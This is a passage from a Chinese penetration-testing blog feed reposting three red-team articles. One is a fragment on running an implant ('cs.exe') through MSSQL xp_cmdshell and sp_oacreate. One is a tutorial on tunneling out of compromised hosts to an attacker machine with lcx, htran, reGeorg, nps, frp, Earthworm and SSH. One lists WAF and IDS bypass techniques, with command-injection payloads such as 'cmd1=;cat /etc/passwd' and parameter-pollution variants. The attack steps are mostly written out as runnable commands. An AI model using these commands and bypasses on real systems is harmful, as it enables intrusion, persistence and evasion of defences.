+<p><a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490086&idx=1&sn=14525c41cd3990554b324faec7364e72&chksm=cfa6be35f8d1372348f13148276b848ee0641364c99575233f0b6186f35ce73c5e15328208c1&scene=21#wechat_redirect">利用MSF上线断网主机的思路分享</a>、<a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490438&idx=1&sn=a2e71148beb114e4f2212203631598e7&chksm=cfa6bf95f8d13683bbd2f04a21865e16021447b3e6317a6b2dbbe23a8916337d20d941e284e6&scene=21#wechat_redirect">利用goproxy http上线不出网主机</a>、<a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490881&idx=1&sn=77b73f2ef31ec88db1da62168a21991f&chksm=cfa6b952f8d13044146692dbd1ac4f7a07d268cea003dd273d70ff5e8edc11cfe6b18bcab194&scene=21#wechat_redirect">利用Pystinger Socks4上线不出网主机</a> 。</p>
+<p><strong>xp_cmdshell：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &quot;cmd /c C:\\Windows\\temp\\cs.exe&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>sp_oacreate：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c C:\\Windows\\temp\\cs.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952772022.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952772123.png" alt="图片"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>端口转发、映射与代理的了解与常用工具的推荐</title>
+    <url>/posts/fe24ba37.html</url>
+    <content><![CDATA[<blockquote>
+<p>编者荐语：推荐使用 <strong>Earthworm代理</strong> 内网流量</p>
+<p>转载自：<a href="https://mp.weixin.qq.com/s/gZ0FviyWiqqh7l3ZiDTrSw">https://mp.weixin.qq.com/s/gZ0FviyWiqqh7l3ZiDTrSw</a></p>
+</blockquote>
+<h2 id="01-概述"><a href="#01-概述" class="headerlink" title="01 概述"></a>01 概述</h2><p>   在渗透测试中，当我们拿下web主机的shell权限后，通常无法直接访问到内网主机的端口，这个时候我们就需要用到代理与转发。端口转发（Port forwarding），有时候被叫做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。端口转发是转发一个网络端口从一个网络节点到另一个网络节点的一个行为，使一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址（局域网内部）上的一个端口。</p>
+<h2 id="02-转发、映射详细解释"><a href="#02-转发、映射详细解释" class="headerlink" title="02 转发、映射详细解释"></a>02 转发、映射详细解释</h2><p>端口映射：端口映射是NAT的一种，功能是把在公网的地址转翻译成私有地址， 采用路由方式的ADSL宽带路由器拥有一个动态或固定的公网IP，ADSL直接接在HUB或交换机上，所有的电脑共享上网。通俗来讲，映射端口，就是将一个内网端口映射到公网上的某个端口，假设我自己的电脑是在内网中，没有公网IP，但是我想提供一个端口供其他人使用，这就是端口映射。</p>
+<h3 id="端口映射与转发的区别："><a href="#端口映射与转发的区别：" class="headerlink" title="端口映射与转发的区别："></a><strong>端口映射与转发的区别：</strong></h3><ol>
+<li><p>概念不同：内网代理，与端口转发端口映射概念完全不同。</p>
+</li>
+<li><p>功能不完全一样：端口映射是将外网的一个端口完全映射给内网一个地址的指定端口，而端口转发是将发往外网的一个端口的通信完全转发给内网一个地址的指定端口。3. 单双向通信：通信端口映射可以实现外网到内网和内网到外网通信双向，而端口转发只能实现外网到内网的单向通信</p>
+</li>
+</ol>
+<h3 id="常见的端口映射方法："><a href="#常见的端口映射方法：" class="headerlink" title="常见的端口映射方法："></a><strong>常见的端口映射方法：</strong></h3><p>内网开启一个端口，边缘机用工具把内网开启的端口映射到本机的某个空闲端口，攻击机访问边缘机的映射端口就可以访问内网的机器。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：Lcx.exe -tran 7777 10.10.10.10 80  </span><br><span class="line">//在肉鸡上执行以上代码，把内网的80端口转发给肉鸡的7777端口</span><br><span class="line">//攻击机直接访问肉鸡的7777端口，即可通信内网主机10.10.10.10 的80端口</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="端口转发的方法："><a href="#端口转发的方法：" class="headerlink" title="端口转发的方法："></a><strong>端口转发的方法：</strong></h3><p>1、先在攻击机执行代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 9898 8888</span><br><span class="line">//监听本机9898端口并把数据发送给8888端口</span><br></pre></td></tr></table></figure>
+
+<p>2、在肉鸡（边界机）上执行一下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 攻击机ip 9898 内网ip 内网端口（80）</span><br><span class="line">//把内网的80端口转发给攻击机的9898端口</span><br></pre></td></tr></table></figure>
+
+<h2 id="03-端口转发常用的软件推荐"><a href="#03-端口转发常用的软件推荐" class="headerlink" title="03 端口转发常用的软件推荐"></a>03 端口转发常用的软件推荐</h2><p>除了上面示例的LCX外，还有以下工具也能完成相同功能。</p>
+<p><strong>Htran</strong>：主要在windows下使用。</p>
+<p>第一个应用场景：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机：htran.exe (-p) -Listen 9999 8888</span><br><span class="line">边缘机：htran.exe (-p) -Slave 攻击机_ip 9999 内网IP 3389</span><br><span class="line">在攻击机上执行:mstsc /v:127.0.0.1:8888</span><br></pre></td></tr></table></figure>
+
+<p>第二应用场景：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">边界机执行，其ip是111.111.120.100：HTran2.4.exe -p -tran 7788 10.10.10.18 3389        </span><br><span class="line">攻击端直接连接肉鸡的7788端口：mstsc /v:111.111.120.100:7788</span><br></pre></td></tr></table></figure>
+
+<p><strong>Earthworm</strong>：既有windows版也有linux版，比较常用，除了做端口转发与映射，还能建立代理。</p>
+<p><strong>其他方法：</strong></p>
+<p>SSH转发</p>
+<p>Netsh：是windows自带的工具，可以帮我们建立端口映射</p>
+<p>Socat转发</p>
+<p>Iptables转发</p>
+<p>相关操作可以自行百度，基本原理都一样，这里就不过多阐述了</p>
+<h2 id="04-代理详细解释"><a href="#04-代理详细解释" class="headerlink" title="04 代理详细解释"></a>04 代理详细解释</h2><h3 id="什么是代理："><a href="#什么是代理：" class="headerlink" title="什么是代理："></a><strong>什么是代理：</strong></h3><p>代理（英语：Proxy），也称网络代理，是一种特殊的网络服务，允许一个网络终端（一般为客户端）通过这个服务与另一个网络终端（一般为服务器）进行非直接的连接。一些网关、路由器等网络设备具备网络代理功能。一般认为代理服务有利于保障网络终端的隐私或安全，防止攻击</p>
+<h3 id="代理的类别："><a href="#代理的类别：" class="headerlink" title="代理的类别："></a><strong>代理的类别：</strong></h3><p>HTTP代理</p>
+<p>SOCKS代理</p>
+<p>FTP代理</p>
+<p>Telnet代理</p>
+<p>SSL代理</p>
+<h3 id="关于代理可用分为正向代理和反向代理："><a href="#关于代理可用分为正向代理和反向代理：" class="headerlink" title="关于代理可用分为正向代理和反向代理："></a><strong>关于代理可用分为正向代理和反向代理：</strong></h3><p>正向代理：客户端主动向代理发送一个请求，然后代理向服务器请求并将获取的内容返回给客户端。LhostàProxyàRhost。</p>
+<p>反向代理：和正向代理相反，一般情况下是代理服务器主动将获取到的资源流量转发给客户端，让客户端接收。客户端只向代理服务器发送普通请求，该请求到哪里去，代理服务器自己判断，最后返回的数据递交给用户。Lhost<proxy>firewall&gt;Rhost</p>
+<h2 id="05-代理工具的使用"><a href="#05-代理工具的使用" class="headerlink" title="05 代理工具的使用"></a>05 代理工具的使用</h2><h3 id="reGeorg："><a href="#reGeorg：" class="headerlink" title="reGeorg："></a>reGeorg：</h3><p>第一步：找到边缘服务器网站环境的开发语言对应的tunnel文件，如目标是apache环境，就把tunnel.nosocket.php文件丢到网站目录下。</p>
+<p>第二步：在攻击机执行以下代码：开启4488端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -u &quot;http://目标IP/tunnel.nosocket.php&quot; -p 4488</span><br></pre></td></tr></table></figure>
+
+<p>第三步：设置代理：使用本地的应用程序：浏览器，socksCap(win)、proxychains（linux）等（注意：这些应用程序可以设置代理）然后通过代理，访问4488端口，就能连接内网机器。</p>
+<h3 id="nps："><a href="#nps：" class="headerlink" title="nps："></a><strong>nps：</strong></h3><p>nps是一款轻量级、高性能、功能强大的内网穿透代理服务器，几乎支持所有协议，支持内网http代理、内网socks5代理、p2p等。简洁但功能强大的WEB管理界面，支持服务端、客户端同时控制，扩展功能强大，全平台兼容，一键注册为服务。NPS分为客户端和服务器端，一般情况下，服务器放在攻击机，客户端放在目标机上！</p>
+<p>下载地址：<a href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a></p>
+<p>使用文档：<a href="https://ehang-io.github.io/nps/#">https://ehang-io.github.io/nps/#</a> </p>
+<p>第一步：启动nps</p>
+<p>攻击机访问nps_server目录，输入.&#x2F;nps start。</p>
+<p>启动nps，第一次使用，会提示有哪些命令可以使用，start，stop，install，uninstall等如果不安装nps服务器，直接启用nps start会报错。</p>
+<p>安装后，即可正常开启nps服务端。</p>
+<p>开启后，会开启多个端口，默认的后台端口是8080，直接浏览器访问localhost:8080即可访问</p>
+<p>第二步：</p>
+<p>访问localhost:8080进入后台，账号密码可看nps生成的配置文件。</p>
+<p>登录后点击客户端—-新增。</p>
+<p>新增后，把nps_client的npc文件丢到边缘机。</p>
+<p>执行.&#x2F;npc -server&#x3D;192.168.211.151:8024 -vkey&#x3D;j057rppz4s0in21j -type&#x3D;tcp</p>
+<p>命令可以在添加的客户端看到，执行后，会显示设备在线。</p>
+<p>第三步：</p>
+<p>根据需要建立对应的通道即可。</p>
+<p>访问本机3389，就相当于访问内网机器的3389</p>
+<h3 id="FRP代理"><a href="#FRP代理" class="headerlink" title="FRP代理"></a><strong>FRP代理</strong></h3><p>frp是一种快速反向代理，可帮助您将NAT或防火墙后面的本地服务器公开到Internet。到目前为止，它支持TCP和UDP以及HTTP和HTTPS协议，在这些协议中，请求可以通过域名转发到内部服务。</p>
+<p>首先这个工具有两端，服务端和客户端，服务端部署在我们具有公网IP的服务器上，客户端放在我们拿到权限的跳板服务器上，双端都需要对配置文件进行配置，我们先来完整的看一下双端的配置文件。</p>
+<p>SSH服务：</p>
+<ol>
+<li>服务器一:有公网的ip地址———–边界机开启端口7000，执行命令开始frp服务</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>内网或者家里的主机—————–内网主机修改配置文件frpc.ini，设置边界机的ip地址，然后执行命令</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 服务器一的ip地址</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">#把本机（内网主机）的22端口开启代理，通过攻击机的6000端口发送出去</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000</span><br><span class="line">*也可以设置在边缘机上执行frpc。通过设置frpc.ini把内网22端口转发出去</span><br><span class="line">./frpc -c ./frpc.ini  # 启动</span><br><span class="line">3.测试------------外部机器代理边界机的6000端口，即可访问内网的ssh服务ssh -p 6000 test@x.x.x.x</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Earthworm代理"><a href="#Earthworm代理" class="headerlink" title="Earthworm代理"></a><strong>Earthworm代理</strong></h3><p>Earthworm代理是一个轻量级功能强大内网穿透工具，基于C开发，该工具能够以在“正向“、”反向“、”多级级联“等方式大同一条网络隧道，直达网络深处，支持Linux，Windows，MacOS，Arm-Linux均包含其内，强烈推荐使用。三大功能：socks5代理、端口转发、端口映射。</p>
+<p>下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">详细参数：</span><br><span class="line">-s 指定链路状态，6种ssocksd  rcsocks  rssocks  lcx_slave  lcx_stran  lcx_listen</span><br><span class="line">-l 本地监听的端口</span><br><span class="line">-d 指定转发或者反弹的主机地址</span><br><span class="line">-e 指定转发或者反弹的主机端口</span><br><span class="line">-f 连接或者映射的主机地址</span><br><span class="line">-g 连接或者映射的主机端口</span><br></pre></td></tr></table></figure>
+
+<p>正向代理：（我–&gt;目标机&#x2F;开端口）（socks的版本是5）</p>
+<p>肉鸡：ew -s ssocksd -l 1080（需要在目标机中开启一个端口）</p>
+<p>反向代理：（目标机–&gt;我&#x2F;开端口）（8888是建立的隧道，1080是传输数据的端口）</p>
+<p>具有公网IP的主机（攻击者机器）：ew -s rcsocks -l 1080 -e 8888（监听端口）</p>
+<p>边缘机：ew -s  rssocks -d 攻击者公网主机IP  -e 8888</p>
+<h3 id="SSH隧道代理"><a href="#SSH隧道代理" class="headerlink" title="SSH隧道代理"></a><strong>SSH隧道代理</strong></h3><p>转发Ssh有三个强大的端口转发命令，分别是本地转发，远程转发，动态转发。</p>
+<h4 id="Socks代理："><a href="#Socks代理：" class="headerlink" title="Socks代理："></a><strong>Socks代理：</strong></h4><p>Ssh -qTfnN -D port remotehost</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数详解：</span><br><span class="line">-C 允许压缩数据</span><br><span class="line">-q 安静模式</span><br><span class="line">-T 不占用shell</span><br><span class="line">-f 后台运行，并推荐加上-n 参数</span><br><span class="line">-N 不执行远程命令</span><br><span class="line">-g 允许远端主机连接本地转发的端口</span><br><span class="line">-n 把stdin 重定向到/dev/null(防止从stdin读取数据)</span><br><span class="line">-L 本地转口转发</span><br><span class="line">-R 远程端口转发</span><br><span class="line">-D 动态转发，即socks代理</span><br><span class="line">-p 指定ssh连接端口</span><br></pre></td></tr></table></figure>
+
+<h4 id="本地转发："><a href="#本地转发：" class="headerlink" title="本地转发："></a><strong>本地转发：</strong></h4><p>远程管理服务器上的mysql，mysql不能直接root用户远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到本地1234端口实现以root用户远程登陆mysql。Ssh -CfNg -L &lt;本机ip&gt;:&lt;本机端口&gt;:&lt;目标B ip&gt;:&lt;目标B端口&gt; 用户名@跳板端口ssh -CfNg -L 1234:127.0.0.1:3306 <a href="mailto:&#x72;&#111;&#111;&#x74;&#64;&#49;&#56;&#53;&#46;&#88;&#x58;&#x2e;&#x58;&#x58;&#46;&#49;&#57;">&#x72;&#111;&#111;&#x74;&#64;&#49;&#56;&#53;&#46;&#88;&#x58;&#x2e;&#x58;&#x58;&#46;&#49;&#57;</a></p>
+<h4 id="远程转发："><a href="#远程转发：" class="headerlink" title="远程转发："></a><strong>远程转发：</strong></h4><p>内网的服务器，外网不能直接访问，使用远程转发，将内网的服务器端口转发到外网端口。这时候访问外网的端口，就可以直接访问到了内网的端口。Ssh -CfNg -R &lt;本地端口&gt;:&lt;目标B ip&gt;:&lt;目标B 端口&gt; 用户名@本地IPssh -CfNg -R 81:127.0.0.1:80 <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#x2e;&#50;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#x2e;&#50;</a>现在只需要在192.168.1.2这个主机上访问127.0.0.1的81端口就是访问内网服务器的80端口</p>
+<h2 id="06-工具特征总结"><a href="#06-工具特征总结" class="headerlink" title="06 工具特征总结"></a>06 工具特征总结</h2><h3 id="Ew："><a href="#Ew：" class="headerlink" title="Ew："></a><strong>Ew：</strong></h3><p>如果利用ew进行全局代理，配合加密得shell，通过流量回溯极难发现，通过服务器本地日志查看，进程查看，网络排查 容易发现痕迹，且ew会被部分查杀软件查杀</p>
+<h3 id="reGeorg：-1"><a href="#reGeorg：-1" class="headerlink" title="reGeorg："></a><strong>reGeorg：</strong></h3><p>利用reGeorg方式来进行内网全局代理之后有明显的流量特征，但是流量中的行为不方便分析，流量行为主要是以流量隧道来进行攻击，我们能直观看见的是目的ip和目的端口，所以可以根据端口全球数量和频率可以大概分析攻击者行为，脚本会被部分查杀软件检查</p>
+<h3 id="nps：-1"><a href="#nps：-1" class="headerlink" title="nps："></a><strong>nps：</strong></h3><p>轻量级的内网穿透工具，完全采用GO语言实现，服务端界面漂亮简洁。支持tcp、udp流量转发，支持内网http代理、内网socks5代理，同时支持snappy压缩、站点保护、加密传输、多路复用、header修改等。支持web图形化管理，集成多用户模式。但是他有一个致命缺点就是在socks5代理下会长连接一直不放开导致结果不准确。</p>
+<h3 id="frp："><a href="#frp：" class="headerlink" title="frp："></a><strong>frp：</strong></h3><p>FRP功能完整，主要采用GO语言实现，重量级的工具，服务端界面样式风格一般。配置繁琐，不同的协议需要配置不同的参数，采用文件存放数据，不支持数据库管理数据。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E3%80%81%E6%98%A0%E5%B0%84%E4%B8%8E%E4%BB%A3%E7%90%86%E7%9A%84%E4%BA%86%E8%A7%A3%E4%B8%8E%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E6%8E%A8%E8%8D%90/640-16546128751784.png" alt="图片"></p>
+<p>转自：银河护卫队super</p>
+]]></content>
+      <categories>
+        <category>RedTeam</category>
+      </categories>
+      <tags>
+        <tag>代理隧道</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>红队攻击-绕过waf以及IDS等流量设备</title>
+    <url>/posts/5a4257e.html</url>
+    <content><![CDATA[<blockquote>
+<p>转载自：<a href="https://mp.weixin.qq.com/s/MHxomRzX8Y40YXuCUpp_Yg">https://mp.weixin.qq.com/s/MHxomRzX8Y40YXuCUpp_Yg</a></p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>2021年了，现在渗透的越来越难了，刚打的shell，过一会就没了，现在的流量设备，安全设备一个比一个流弊，payload一过去就面临着封禁，为了对抗设备，一些大佬们总结出很多绕过这种基于签名的<em>WAF 或 IDS</em> 的手法，为什么叫基于签名的？因为这种设备也是检查数据包中一些特征字符，比如什么and 1&#x3D;1 什么的，但是肯定不会这么简单的，除了几个黑名单的固定的特征字符，很多都是那种通过正则去匹配特征字符的，这也是造成绕过可能性的原因。</p>
+<h2 id="常规手法"><a href="#常规手法" class="headerlink" title="常规手法"></a><strong>常规手法</strong></h2><h3 id="1-直接通过真实ip访问"><a href="#1-直接通过真实ip访问" class="headerlink" title="1.直接通过真实ip访问"></a><strong>1.直接通过真实ip访问</strong></h3><p>这是一种对待云waf最有效的办法，只要找到做cdn的之前的真实ip，那么直接通过ip访问，则会使云waf完全失效，web应用服务器失去云保护。</p>
+<h4 id="1-1-怎么找到真实ip？"><a href="#1-1-怎么找到真实ip？" class="headerlink" title="1.1 怎么找到真实ip？"></a><strong>1.1 怎么找到真实ip？</strong></h4><p>手法挺多的，我比较常用的，就是直接把网站的titile给取下来放到一些搜索引擎搜索，比如在fofa中搜索网站titile，一般都能找到，钟馗之眼也不错，当然手法很多，找比较实用的就行。</p>
+<h4 id="1-2-通过ip去访问一些网站，可能提示web页面找不到？"><a href="#1-2-通过ip去访问一些网站，可能提示web页面找不到？" class="headerlink" title="1.2 通过ip去访问一些网站，可能提示web页面找不到？"></a><strong>1.2 通过ip去访问一些网站，可能提示web页面找不到？</strong></h4><p>究其原因是，有些网站在路由上直接使用的域名为硬路由，这时候需要修改host 解析文件，把相关域名和真实ip 给对应上填上，再用域名去访问。</p>
+<p>linux host文件路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>windows host文件路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32\drivers\etc</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-切换协议"><a href="#2-切换协议" class="headerlink" title="2.切换协议"></a><strong>2.切换协议</strong></h3><p>通过切换http到https，或者https切换到http，如果web站点没有进行强制https访问，那么http也能访问到其站点，如果waf错误配置，也能起到一点效果（方法比较特殊），还可以通过增加www，或者删除www前坠有时也管用。</p>
+<h3 id="3-通过IPv6-访问"><a href="#3-通过IPv6-访问" class="headerlink" title="3.通过IPv6 访问"></a><strong>3.通过IPv6 访问</strong></h3><p>有许多入侵检测系统也只监控 IPv4 流量，没有对IPv6 进行监控。</p>
+<p>访问格式：http:&#x2F;&#x2F;[ipv6地址]:80&#x2F;index.html</p>
+<p>ipv6为：2001:470:c:1818::2</p>
+<p>访问地址：http:&#x2F;&#x2F;[2001:470:c:1818::2]:80&#x2F;index.html</p>
+<h3 id="4-对http包头进行修改"><a href="#4-对http包头进行修改" class="headerlink" title="4.对http包头进行修改"></a><strong>4.对http包头进行修改</strong></h3><p>方法之一就是添加以下标头： </p>
+<ul>
+<li>X-forwarded-for</li>
+<li>X-remote-IP</li>
+<li>X-originating-IP</li>
+<li>x-remote-addr</li>
+<li>x-client-ip</li>
+</ul>
+<p>例如：</p>
+<p>X-Originating-IP: 127.0.0.1</p>
+<p>在一些做了访客流量负载的web架构很常见，他并不是把web服务器映射出去，而是把外面的访问流量通过一台流量转发机器转发到内网web应用服务器，这种形式的话，在转发进来的数据包中就会出现X-forwarded-for 等字段，标示着是哪个ip访问的web服务。</p>
+<p>如果包存在：</p>
+<ul>
+<li>Content-Type: text&#x2F;html</li>
+</ul>
+<p>那么可以尝试做以下修改：</p>
+<ul>
+<li>Content-Type:      #直接删除类型值</li>
+<li>Content-Type: text&#x2F;htmlzzzzzzzzz  #错误的类型值</li>
+<li>Content-Type: application&#x2F;octet-stream #其他类型值</li>
+</ul>
+<p>有时候将 MIME 类型设置为 multipart&#x2F;form 数据然后对请求进行错误处理也有奇效。</p>
+<ul>
+<li>Content-Type: multipart&#x2F;form-data ; boundary&#x3D;0000</li>
+<li>Content-Type: mUltiPart&#x2F;ForM-dATa; boundary&#x3D;0000</li>
+<li>Content-Type: multipart&#x2F;form-datax; boundary&#x3D;0000</li>
+<li>Content-Type: multipart&#x2F;form-data, boundary&#x3D;0000</li>
+<li>Content-Type: multipart&#x2F;form-data boundary&#x3D;0000</li>
+<li>Content-Type: multipart&#x2F;whatever; boundary&#x3D;0000</li>
+<li>Content-Type: multipart&#x2F;; boundary&#x3D;0000</li>
+</ul>
+<p>对HTTP方法进行更改：</p>
+<p>把get 改成post ，post改成get，或者直接改成put</p>
+<p>有时候错误方法也能成功访问</p>
+<p>请求可以通过“GETS”而不是“GET”发送，并且在许多情况下仍会按预期运行。</p>
+<p>特别是在 PHP 中，根据配置，cookie 值可以被视为参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php</span><br><span class="line">cookie: cmd1=;cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>还有的是就是把http协议 1.1 改成1.0 ，因为大部分服务器也支持1.0版本。</p>
+<h3 id="5-对参数操作"><a href="#5-对参数操作" class="headerlink" title="5 对参数操作"></a><strong>5 对参数操作</strong></h3><p>参数名称可以通过多种方式进行操作，具体服务器上运行的服务器端语言，还有取决于服务器的特性，这里讲一下php和asp的绕过。</p>
+<h4 id="1-通过硬编码值造成绕过"><a href="#1-通过硬编码值造成绕过" class="headerlink" title="1.通过硬编码值造成绕过"></a>1.通过硬编码值造成绕过</h4><p>PHP 中的 **+**符号可用于实现此目的，而 ASP 中的 <strong>%</strong> 符号将实现类似的结果</p>
+<p>在 ASP 中，可以将无效的 URL 编码添加到参数名称中（请注意，编码必须无效才能正常工作）</p>
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php?%value=payload/cmd/a.php?%&#125;9value=payload</span><br></pre></td></tr></table></figure>
+
+<p>在 PHP 中，加号可以达到同样的效果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php?+value=payload</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-多个参数（HTTP参数污染）"><a href="#2-多个参数（HTTP参数污染）" class="headerlink" title="2. 多个参数（HTTP参数污染）"></a>2. 多个参数（HTTP参数污染）</h4><p>在php中，如果遇到多个参数，那么是从右到左来取参数值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php?value=1111111111111111111111111111&amp;value=payload</span><br></pre></td></tr></table></figure>
+
+<p>又比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php?value=payload&amp;value=payload</span><br></pre></td></tr></table></figure>
+
+<p>又比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php?page=cat /etc/passswd&amp;page=</span><br></pre></td></tr></table></figure>
+
+<p>又比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/cmd/a.php? page=cat&amp;page=/etc/passswd&amp;page=/passwd</span><br></pre></td></tr></table></figure>
+
+<p>在保证结果正确的情况下，想怎么玩就怎么玩</p>
+<h4 id="3-利用服务器特性"><a href="#3-利用服务器特性" class="headerlink" title="3.利用服务器特性"></a>3.利用服务器特性</h4><p>比如windows 的特性可以在文件名之后加_等符号，linux 加‘</p>
+<h3 id="6-通过控制字符"><a href="#6-通过控制字符" class="headerlink" title="6.通过控制字符"></a><strong>6.通过控制字符</strong></h3><p>这些控制字符包括</p>
+<ul>
+<li>%0d <strong>(CR)</strong></li>
+<li>%0a <strong>(LF)</strong></li>
+<li>%0d%0a <strong>(CRLF)</strong></li>
+<li>%09</li>
+<li>%0B</li>
+<li>%00</li>
+</ul>
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/file.txt</span><br></pre></td></tr></table></figure>
+
+<p>改成：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/file%00.txt</span><br></pre></td></tr></table></figure>
+
+<p>对于有一些waf很实用。</p>
+<h3 id="7-通过变换路径来bypass"><a href="#7-通过变换路径来bypass" class="headerlink" title="7.通过变换路径来bypass"></a><strong>7.通过变换路径来bypass</strong></h3><p>一些waf 或者web应用通过web路由进行封禁，体现为访问某个特定的url路径为403 等状态。</p>
+<p>但是通过url路径的特性，能进行绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/path//vuln.php </span><br><span class="line">/////////////////路径//////////////// vuln.php?value=PAYLOAD #在php中</span><br><span class="line">/path/./vuln.php?value=PAYLOAD</span><br><span class="line">/path/blah/../vuln.php?value=PAYLOAD </span><br><span class="line">/path/blah/blah/blah/../../../vuln.php?value=PAYLOAD </span><br><span class="line">/PaTh/VULN.PHP?VaLuE=PAYLOAD #windows大小写不分</span><br></pre></td></tr></table></figure>
+
+<p>通过中间件的特性，在 Apache Tomcat中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/path;/vuln.php?value=PAYLOAD</span><br><span class="line">/path/;lol=lol/vuln.php?value=PAYLOAD</span><br></pre></td></tr></table></figure>
+
+<p>PATH_INFO（通过 Apache 设置的环境变量）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/vuln/vuln.php/lolol?value=PAYLOAD</span><br><span class="line">/path/vuln.php;lol=lol?value=PAYLOAD</span><br></pre></td></tr></table></figure>
+
+<p>等。。。。。。</p>
+<p>姿势列举不完的，灵活组合才是最强姿势。</p>
+<p><strong>8.分块传输</strong></p>
+<p>注意：</p>
+<p>1.只有HTTP&#x2F;1.1支持分块传输</p>
+<p>2.POST包都支持分块，不局限仅仅于反序列化和上传包</p>
+<p>3.Transfer-Encoding: chunked大小写不敏感</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">github：</span><br><span class="line">https://github.com/c0ny1/chunked-coding-converter/releases/tag/0.4.0</span><br></pre></td></tr></table></figure>
+
+<p><strong>8.1 通过burp chrunk插件分块编码传输</strong></p>
